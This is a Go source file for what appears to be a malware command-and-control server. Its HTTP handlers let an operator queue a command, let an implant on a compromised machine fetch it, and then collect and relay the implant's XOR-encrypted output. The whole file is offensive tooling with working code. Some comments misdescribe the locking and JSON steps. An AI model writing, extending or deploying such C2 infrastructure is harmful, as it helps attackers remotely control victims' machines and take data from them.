package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"sync"
)

// Because we have to wait for the implant to receive the command and actually run it, we need to store inside a Mutex so that it stays in memory
var (
	mu            sync.RWMutex
	storedCommand *Command
)

// Method for the operator to actually send the command to the implant
func getCommand(w http.ResponseWriter, r *http.Request) {
	defer r.Body.Close()

	// Set the response content type to JSON
	w.Header().Set("Content-Type", "application/json")

	// Define a switch statement to handle GET or POST requests
	switch r.Method {
	case "GET":
		// If the request is a GET request, we unlock the Mutex and release the command for the implant
		mu.RLock()
		defer mu.RUnlock()

		// Since the command is basically "consumed", we check if there is a command that has not been released
		if storedCommand == nil {
			http.Error(w, "No command available", http.StatusNotFound)
			return
		}

		// If such command exists, unmarshal it so that we can send it to the impant
		jsonCommand, err := json.Marshal(storedCommand)
		if err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)
			return
		}

		w.WriteHeader(http.StatusOK)

		// Write the JSON command to the response
		if _, err := w.Write(jsonCommand); err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)
			return
		}

	default:
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
}

func postCommand(w http.ResponseWriter, r *http.Request) {
	defer r.Body.Close()
	w.Header().Set("Content-Type", "application/json")
	// If the request is a POST, which would ideally be the operator sending the command
	// Receive the request for the command, unmarshal it into the Command struct
	var command Command
	decoder := json.NewDecoder(r.Body)
	if err := decoder.Decode(&command); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	// With the Mutex, we store it in memory
	mu.Lock()
	storedCommand = &command
	mu.Unlock()

	w.WriteHeader(http.StatusOK)
	fmt.Println("Fetching command:", command.Input, "for Implant User:", command.ImplantUser, "From Operator:", command.Operator)
}

// Define the buffer that will store the XOR encrypted output
var outputBuffer []byte
var bufferMutex sync.Mutex

// This method will receive the output from the implant
func postOutput(w http.ResponseWriter, r *http.Request) {
	defer r.Body.Close()

	// Upon receiving the output, read it and store the body
	body, err := ioutil.ReadAll(r.Body)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	fmt.Println("Received XOR encrypted output:", string(body))

	// Lock the mutex and save the body in the outputBuffer
	bufferMutex.Lock()
	outputBuffer = body
	bufferMutex.Unlock()
}

func getOutput(w http.ResponseWriter, r *http.Request) {
	// We first unlock the stored mutex which holdes the Output struct and put it inside a variable
	bufferMutex.Lock()
	output := outputBuffer

	fmt.Println(string(output))

	// Then we send off the XOR encrypted output for the Operator
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Write(output)

	// Clear the outputBuffer
	outputBuffer = []byte{}
	bufferMutex.Unlock()
}
